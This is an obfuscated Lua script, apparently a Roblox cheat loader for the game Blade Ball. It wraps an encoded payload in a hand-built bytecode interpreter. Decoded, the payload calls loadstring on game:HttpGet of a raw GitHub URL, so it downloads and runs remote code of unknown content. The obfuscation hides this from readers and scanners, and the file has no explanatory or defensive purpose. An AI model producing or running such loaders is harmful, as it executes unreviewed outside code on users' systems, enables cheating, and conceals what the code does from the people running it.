local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then local v80=0;while true do if (v80==0) then v19=v0(v3(v30,1,1));return "";end end else local v81=v2(v0(v30,16));if v19 then local v87=v5(v81,v19);v19=nil;return v87;else return v81;end end end);local function v20(v31,v32,v33)if v33 then local v82=(v31/(2^(v32-1)))%((5 -3)^(((v33-(2 -(1 + 0))) -(v32-(1 -0))) + (2 -1))) ;return v82-(v82%((1497 -(282 + 595)) -(555 + 64))) ;else local v83=0;local v84;while true do if (v83==(931 -(857 + 74))) then v84=(570 -(367 + 201))^(v32-(928 -((1851 -(1523 + 114)) + 713))) ;return (((v31%(v84 + v84))>=v84) and (1 + 0)) or 0 ;end end end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35,v36=v1(v16,v18,v18 + 2 + 0 );v18=v18 + (2 -0) ;return (v36 * 256) + v35 ;end local function v23()local v37,v38,v39,v40=v1(v16,v18,v18 + (1068 -(68 + 997)) );v18=v18 + (1274 -(226 + 1044)) ;return (v40 * (73054774 -56277558)) + (v39 * (65653 -(32 + 85))) + (v38 * (56 + 195 + 5)) + v37 ;end local function v24()local v41=v23();local v42=v23();local v43=958 -(892 + (1551 -(998 + 488))) ;local v44=(v20(v42,2 -1 ,36 -16 ) * ((1189 -(1069 + 118))^(72 -40))) + v41 ;local v45=v20(v42,38 -17 ,381 -(87 + 263) );local v46=((v20(v42,212 -(67 + 113) )==(1 + 0)) and  -(792 -(368 + 423))) or (1 + 0) ;if (v45==((0 + 0) -0)) then if (v44==0) then return v46 * (0 + 0) ;else local v88=0 -(0 + 0) ;while true do if (v88==((1724 -(201 + 571)) -(802 + 150))) then v45=2 -(1139 -(116 + 1022)) ;v43=0 -0 ;break;end end end elseif (v45==(879 + 1168)) then return ((v44==(0 + 0)) and (v46 * (1/(997 -(915 + 82))))) or (v46 * NaN) ;end return v8(v46,v45-(2896 -1873) ) * (v43 + (v44/((2 + 0)^(482 -(44 + 386))))) ;end local function v25(v47)local v48;if  not v47 then v47=v23();if (v47==(0 -0)) then return "";end end v48=v3(v16,v18,(v18 + v47) -(1 + 0) );v18=v18 + v47 ;local v49={};for v63=3 -2 , #v48 do v49[v63]=v2(v1(v3(v48,v63,v63)));end return v6(v49);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v50=0 + 0 ;local v51;local v52;local v53;local v54;local v55;local v56;while true do local v65=202 -(14 + 188) ;while true do if (v65==0) then if (v50==2) then local v95=0;local v96;while true do if (v95~=0) then else v96=0;while true do local v100=0;while true do if (v100==0) then if (v96==1) then return v54;end if ((675 -(534 + 141))==v96) then local v152=0 + 0 ;while true do if (v152~=(0 + 0)) then else for v160=1,v23() do local v161=0 + 0 ;local v162;local v163;while true do if (v161==0) then local v166=0 -0 ;while true do if (v166==0) then v162=0;v163=nil;v166=1 -0 ;end if (1==v166) then v161=2 -1 ;break;end end end if (v161==1) then while true do if (v162~=(0 + 0)) then else v163=v21();if (v20(v163,1,1)==(0 + 0)) then local v167=396 -(115 + 281) ;local v168;local v169;local v170;local v171;local v172;while true do if (v167==(2 -1)) then v170=nil;v171=nil;v167=2;end if (v167~=0) then else local v173=0;while true do if ((0 + 0)~=v173) then else v168=0;v169=nil;v173=2 -1 ;end if (v173==(3 -2)) then v167=868 -(550 + 317) ;break;end end end if (v167~=(2 -0)) then else v172=nil;while true do if (v168==0) then v169=0 -0 ;v170=nil;v168=1;end if (v168==(2 -1)) then local v174=0;while true do if (v174==1) then v168=2;break;end if ((285 -(134 + 151))==v174) then v171=nil;v172=nil;v174=1666 -(970 + 695) ;end end end if (2==v168) then while true do if (v169~=(3 -1)) then else local v175=1990 -(582 + 1408) ;local v176;while true do if (v175==(0 -0)) then v176=0 -0 ;while true do if (v176~=1) then else v169=11 -8 ;break;end if (v176~=(1824 -(1195 + 629))) then else local v183=0 -0 ;local v184;while true do if (v183==(241 -(187 + 54))) then v184=780 -(162 + 618) ;while true do if (v184==(1 + 0)) then v176=1;break;end if (v184==0) then local v187=0;while true do if (v187==(1 + 0)) then v184=1 -0 ;break;end if (v187==0) then if (v20(v171,1,1 -0 )==1) then v172[2]=v56[v172[1 + 1 ]];end if (v20(v171,2,2)~=1) then else v172[1639 -(1373 + 263) ]=v56[v172[1003 -(451 + 549) ]];end v187=1;end end end end break;end end end end break;end end end if (v169==3) then if (v20(v171,3,1 + 2 )==(1 -0)) then v172[4]=v56[v172[4]];end v51[v160]=v172;break;end if (v169~=(1 -0)) then else local v178=0;local v179;while true do if (v178==0) then v179=0;while true do if (v179==(1384 -(746 + 638))) then local v185=0 + 0 ;while true do if ((1 -0)~=v185) then else v179=342 -(218 + 123) ;break;end if (v185==0) then local v186=1581 -(1535 + 46) ;while true do if ((1 + 0)~=v186) then else v185=1;break;end if (v186==(0 + 0)) then v172={v22(),v22(),nil,nil};if (v170==0) then local v188=0 -0 ;local v189;while true do if (0==v188) then v189=0;while true do if (v189~=0) then else v172[1470 -(899 + 568) ]=v22();v172[4]=v22();break;end end break;end end elseif (v170==(1 + 0)) then v172[3]=v23();elseif (v170==2) then v172[7 -4 ]=v23() -((605 -(268 + 335))^(306 -(60 + 230))) ;elseif (v170~=3) then else local v198=572 -(426 + 146) ;local v199;local v200;while true do if (0~=v198) then else v199=0;v200=nil;v198=1;end if ((1 + 0)~=v198) then else while true do if ((1456 -(282 + 1174))~=v199) then else v200=0;while true do if ((811 -(569 + 242))==v200) then v172[8 -5 ]=v23() -((1 + 1)^16) ;v172[1028 -(706 + 318) ]=v22();break;end end break;end end break;end end end v186=1;end end end end end if (v179~=1) then else v169=1253 -(721 + 530) ;break;end end break;end end end if (0==v169) then local v180=0;while true do if (v180~=0) then else v170=v20(v163,2,1274 -(945 + 326) );v171=v20(v163,9 -5 ,6);v180=1;end if (v180==(1 + 0)) then v169=1;break;end end end end break;end end break;end end end break;end end break;end end end for v164=701 -(271 + 429) ,v23() do v52[v164-1 ]=v28();end v152=1;end if (v152~=1) then else v96=1;break;end end end break;end end end break;end end end if (v50==1) then local v97=0 + 0 ;while true do if (v97~=(1500 -(1408 + 92))) then else v55=v23();v56={};v97=1;end if (v97==1) then for v101=1,v55 do local v102=0;local v103;local v104;while true do if (v102==(1087 -(461 + 625))) then if (v103==(1289 -(993 + 295))) then v104=v21()~=(0 + 0) ;elseif (v103==2) then v104=v24();elseif (v103~=3) then else v104=v25();end v56[v101]=v104;break;end if (v102==0) then v103=v21();v104=nil;v102=1172 -(418 + 753) ;end end end v54[3]=v21();v97=2;end if (v97~=2) then else v50=1 + 1 ;break;end end end v65=1;end if (v65==(1 + 0)) then if ((0 + 0)==v50) then local v98=0;while true do if (1==v98) then v53={};v54={v51,v52,nil,v53};v98=1771 -(1749 + 20) ;end if (v98~=2) then else v50=1;break;end if (v98~=(0 + 0)) then else v51={};v52={};v98=1;end end end break;end end end end local function v29(v57,v58,v59)local v60=v57[1];local v61=v57[2];local v62=v57[3];return function(...)local v66=v60;local v67=v61;local v68=v62;local v69=v27;local v70=1;local v71= -1;local v72={};local v73={...};local v74=v12("#",...) -1 ;local v75={};local v76={};for v85=0,v74 do if (v85>=v68) then v72[v85-v68 ]=v73[v85 + 1 ];else v76[v85]=v73[v85 + 1 ];end end local v77=(v74-v68) + 1 ;local v78;local v79;while true do local v86=0;while true do if (0==v86) then v78=v66[v70];v79=v78[1];v86=1;end if (v86==1) then if (v79<=3) then if (v79<=1) then if (v79>0) then local v105=v78[2];v76[v105]=v76[v105](v13(v76,v105 + 1 ,v71));else do return;end end elseif (v79==2) then v76[v78[2]]=v78[3];else local v109=0;local v110;local v111;local v112;local v113;local v114;while true do if (0==v109) then v110=nil;v111,v112=nil;v113=nil;v114=nil;v109=1;end if (v109==2) then v70=v70 + 1 ;v78=v66[v70];v114=v78[2];v113=v76[v78[3]];v109=3;end if (v109==9) then do return;end break;end if (v109==3) then v76[v114 + 1 ]=v113;v76[v114]=v113[v78[4]];v70=v70 + 1 ;v78=v66[v70];v109=4;end if (v109==1) then v76[v78[2]]=v59[v78[3]];v70=v70 + 1 ;v78=v66[v70];v76[v78[2]]=v59[v78[3]];v109=2;end if (6==v109) then v71=(v112 + v114) -1 ;v110=0;for v153=v114,v71 do v110=v110 + 1 ;v76[v153]=v111[v110];end v70=v70 + 1 ;v109=7;end if (v109==7) then v78=v66[v70];v114=v78[2];v76[v114]=v76[v114](v13(v76,v114 + 1 ,v71));v70=v70 + 1 ;v109=8;end if (v109==5) then v70=v70 + 1 ;v78=v66[v70];v114=v78[2];v111,v112=v69(v76[v114](v13(v76,v114 + 1 ,v78[3])));v109=6;end if (v109==8) then v78=v66[v70];v76[v78[2]]();v70=v70 + 1 ;v78=v66[v70];v109=9;end if (v109==4) then v76[v78[2]]=v78[3];v70=v70 + 1 ;v78=v66[v70];v76[v78[2]]=v78[3]~=0 ;v109=5;end end end elseif (v79<=5) then if (v79==4) then local v115=0;local v116;local v117;while true do if (v115==1) then v76[v116 + 1 ]=v117;v76[v116]=v117[v78[4]];break;end if (v115==0) then v116=v78[2];v117=v76[v78[3]];v115=1;end end else v76[v78[2]]=v59[v78[3]];end elseif (v79<=6) then local v120=0;local v121;local v122;local v123;local v124;while true do if (v120==1) then v71=(v123 + v121) -1 ;v124=0;v120=2;end if (v120==0) then v121=v78[2];v122,v123=v69(v76[v121](v13(v76,v121 + 1 ,v78[3])));v120=1;end if (v120==2) then for v156=v121,v71 do local v157=0;while true do if (v157==0) then v124=v124 + 1 ;v76[v156]=v122[v124];break;end end end break;end end elseif (v79>7) then v76[v78[2]]();else v76[v78[2]]=v78[3]~=0 ;end v70=v70 + 1 ;break;end end end end;end return v29(v28(),{},v17)(...);end v15("LOL!043O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403473O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4461726B4875627A2F426C61646542612O6C2F6D61696E2F626C61646562612O6C2E6C756100093O0012033O00013O00122O000100023O00202O00010001000300122O000300046O000400016O000100049O0000026O000100016O00017O00",v9(),...);
